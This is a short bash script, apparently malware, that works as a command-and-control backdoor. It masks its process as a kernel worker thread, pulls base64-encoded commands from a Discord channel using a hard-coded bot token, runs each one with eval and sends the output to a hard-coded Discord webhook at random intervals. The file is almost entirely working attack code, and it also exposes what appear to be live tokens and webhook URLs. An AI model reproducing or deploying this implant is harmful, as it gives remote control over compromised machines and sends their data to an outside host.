#!/bin/bash

# ==================================
# █▄▄ █   █▀▄▀█ █▀▀ █▄░█ ▀█▀ █▀▀ █▀█
# █▄█ █   █░▀░█ ██▄ █░▀█ ░█░ ██▄ █▀▄
# ==================================
# Pure C2 Spine - Nothing Extra

WEBHOOK_URL="https://discord.com/api/webhooks/1333683986286776340/FYDrvCm9zGAkC8X-gzPpD9iwGguiCvTebP3mOfVy5hxl5b8CRvzPBydf-FdFL7GPey8v"
CHANNEL_ID="1101487519243190303"
BOT_TOKEN="MTMzNzU3NDI3NTYyMzk0NDE5Mg.Gf4Y4q.tnJK8422UP1cSOMEBsT8djuYfjEkpmZlTnMfXI"

exec -a "[kworker/1:1+ksoftirqd/12]" /bin/bash "$0" &

while :; do
  CMD=$(curl -sf -H "Authorization: Bot $BOT_TOKEN" \
    "https://discord.com/api/v9/channels/$CHANNEL_ID/messages?limit=1" | 
    jq -r '.[0].content' | 
    base64 -d 2>/dev/null)

  # تحقق من محتوى الأمر بعد فك التشفير
  echo "Executing command: $CMD"

  OUTPUT=$(eval "$CMD" 2>&1)
  
  # إرسال البيانات مباشرة بدون base64
  curl -sf -X POST "$WEBHOOK_URL" \
    -H "Content-Type: application/json" \
    -d "{\"content\":\"$(date +%s.%N)|$OUTPUT\"}" >/dev/null
  
  sleep $(awk -v seed=$RANDOM 'BEGIN { srand(seed); printf("%.4f\n", rand()*13+1) }')
done
